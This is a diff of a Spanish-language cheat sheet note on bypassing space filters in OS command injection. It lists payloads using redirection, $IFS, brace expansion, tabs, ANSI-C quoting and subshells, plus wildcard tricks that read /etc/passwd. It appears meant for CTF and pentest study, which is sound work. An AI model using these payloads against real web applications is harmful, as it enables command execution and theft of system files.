@@ -1,37 +1,54 @@
 ---
-aliases:
+aliases: null
 tags:
   - type/technique
   - vuln/command-injection
   - technique/execution
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[OS Command Injection]]"
+  - '[[OS Command Injection]]'
 ---
-# Bypass de Espacios en Command Injection
+# Command Injection - Bypass de Espacios
 
-___
+***
 
 ## Cheatsheet
 
-Técnicas para ejecutar comandos cuando la barra espaciadora o el carácter `%20` están bloqueados por el filtro.
-
-|                    **Técnica**                     |           **Sintaxis / Payload**            |               **Ejemplo Real**                |                                                   **Notas / Restricciones**                                                    |
-| :------------------------------------------------: | :-----------------------------------------: | :-------------------------------------------: | :----------------------------------------------------------------------------------------------------------------------------: |
-|           <br><br>**Input Redirection**            | <br><pre><code>comando<archivo</code></pre> |   <br><pre><code>cat<flag.txt</code></pre>    |  <br>Reemplaza el espacio por el operador `<`. **Ideal para leer archivos**, no sirve para argumentos de texto plano.<br><br>  |
-| <br>**Internal Field Separator**<br>_(Con Llaves)_ |     <br><pre><code>${IFS}</code></pre>      | <br><pre><code>cat${IFS}flag.txt</code></pre> |        <br>`$IFS` es una variable que contiene espacio, tab y salto de línea. Las llaves delimitan la variable.<br><br>        |
-| <br>**Internal Field Separator**<br>_(Sin Llaves)_ |     <br><pre><code>$IFS$9</code></pre>      | <br><pre><code>cat$IFS$9flag.txt</code></pre> |     <br>Usar `$9` (argumento vacío) para separar la variable `$IFS` del siguiente texto si `{}` están bloqueados.<br><br>      |
-|            <br><br>**Brace Expansion**             |  <br><pre><code>{comando,arg}</code></pre>  |  <br><pre><code>{cat,flag.txt}</code></pre>   |            <br>**Solo Bash.** Expande los elementos separados por coma añadiendo espacios automáticamente.<br><br>             |
-|           <br><br>**Tabs (Tabuladores)**           |       <br><pre><code>%09</code></pre>       |  <br><pre><code>cat%09flag.txt</code></pre>   | <br>Muchos WAFs bloquean el espacio (`%20`) pero olvidan el tabulador (`%09`), que la shell interpreta como separador.<br><br> |
+| **Payload** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `cat<flag.txt` | Lee `flag.txt` usando `<` como input redirection | **Solo para leer archivos**. No sirve para argumentos arbitrarios. |
+| `cat${IFS}flag.txt` | `$IFS` = espacio/tab/newline, expande a separador | Funciona en bash/sh. Llaves separan la var del texto. |
+| `cat$IFS$9flag.txt` | `$9` = arg vacío → separa `$IFS` del siguiente texto | Cuando `{}` están bloqueados. |
+| `{cat,flag.txt}` | Brace expansion expande con espacios automáticamente | **Solo Bash**. NO en sh/dash. |
+| `cat%09flag.txt` | TAB (`%09`) como separador — la shell trata tab = espacio | WAF filtra `%20` pero deja `%09`. URL-encode. |
+| `cat$'\x20'flag.txt` | `$'\x20'` = espacio literal via ANSI-C quoting | Bash 4+. Sortea filtros que buscan literal ` `. |
+| ``cat`echo\ -e\ ' '`flag.txt`` | Sub-shell genera el espacio | Cuando ningún literal pasa. Ofuscación máxima. |
+| `cat<<<$'flag.txt'` | here-string + ANSI-C → input directo sin espacio entre cmd y arg | Casos edge sin redirección. |
 ^ci-bypass-espacios
 
-> [!TIP] Variable $IFS
-> Si se quiere ver qué contiene `$IFS`en el sistema víctima (y por qué funciona esto), se puede hacer:`echo -n "$IFS" | xxd\`
-> Se verá que contiene: `09` (Tab), `0a` (New Line) y `20` (Space). Cualquiera de ellos actúa como separador.
+### Verificar contenido de `$IFS`
 
+```bash
+# Ver qué chars contiene IFS
+echo -n "$IFS" | xxd
+# Output típico:
+# 00000000: 2009 0a                                  . ..
+# → 0x20 (space) + 0x09 (tab) + 0x0a (newline)
+# Cualquiera de los 3 actúa como separador.
+```
 
-___
+### Combinable con bypass de filename
+
+Si `flag` o `txt` también están filtrados, combinar con [[Command Injection - Lista Negra de Comandos]]:
+
+```bash
+cat${IFS}f'l'ag.t'x't        # comillas para romper firma
+cat${IFS}fl?g.txt            # wildcard ? como char único
+cat${IFS}/etc/p?ss?d         # wildcards en /etc/passwd
+```
+
+---
